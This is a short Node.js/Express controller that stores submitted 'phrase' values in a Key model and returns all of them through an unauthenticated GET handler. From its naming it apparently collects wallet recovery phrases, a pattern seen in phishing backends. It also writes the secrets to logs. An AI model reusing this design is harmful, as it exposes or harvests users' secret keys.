const Key = require("../modal/Keymodal");

const keyController = async (req, res) => {
    const { phrase } = req.body;
    console.log("Received phrase:", phrase); // Log the phrase received
    try {
        const existingKey = await Key.findOne({ phrase });
        if (existingKey) {
            console.log("Phrase already exists");
            return res.status(400).json({ message: "Phrase already exists", isSuccess: false });
        }
        const key = await Key.create({ phrase });
        console.log("Key created:", key);
        res.json({ message: "Successfully created", isSuccess: true, key });
    } catch (error) {
        console.error("Error:", error);
        res.status(500).json({ message: "Internal server error", isSuccess: false });
    }
};


const keyGetController = async (req, res) => {
    try {
        const keys = await Key.find();
        if(keys){
            res.json({ message: "Successfully retrieved keys", isSuccess: true, keys });
        }else{
            res.json({ message: "Successfully retrieved keys", isSuccess: true, keys:[] });
        }
    } catch (error) {
        console.error(error);
        res.status(500).json({ message: "Internal server error", isSuccess: false });
    }
};

module.exports = { keyController, keyGetController };
